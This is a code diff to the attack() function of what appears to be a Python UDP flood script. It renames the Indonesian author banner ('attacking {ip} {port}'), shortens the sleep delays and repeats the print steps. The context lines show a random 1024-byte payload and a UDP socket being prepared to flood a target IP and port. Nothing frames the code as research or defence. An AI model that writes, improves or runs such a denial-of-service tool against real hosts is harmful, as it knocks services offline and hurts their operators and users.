@@ -84,19 +84,39 @@ def attack(ip, port, time, size):
     if port is not None:
             port = max(1, min(65535, port))
 
-    fmt = 'Tok... Tok... Tok... Paket Paket Dari xLyz a.k.a Benn Menyerang {ip} {port} '.format(
+    fmt = 'Tok... Tok... Tok... Paket Paket Dari justbwnn Menyerang {ip} {port} '.format(
             ip='IP {ip}'.format(ip=ip),
             port='Port {port}'.format(port=port) if port else 'random ports',
             time='{time} seconds'.format(time=time) if str(time).isdigit() else 'unlimited time',
             size=size
     )
-    sleep(3)
+    sleep(0.5)
     print(fmt)
-    sleep(3)
+    sleep(0.5)
     print(fmt)
-    sleep(3)
+    sleep(0.5)
     print(fmt)
- 
+    sleep(0.5)
+    print(fmt)
+    sleep(0.5)
+    print(fmt)
+    sleep(0.5)
+    print(fmt)
+    sleep(0.5)
+    print(fmt)
+    sleep(0.5)
+    print(fmt)
+    sleep(0.5)
+    print(fmt)
+    sleep(0.5)
+    print(fmt)
+    sleep(0.5)
+    print(fmt)
+    sleep(0.5)
+    print(fmt)
+    sleep(0.5)
+    print(fmt)
+
     startup = tt()
     size = random._urandom(1024)
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
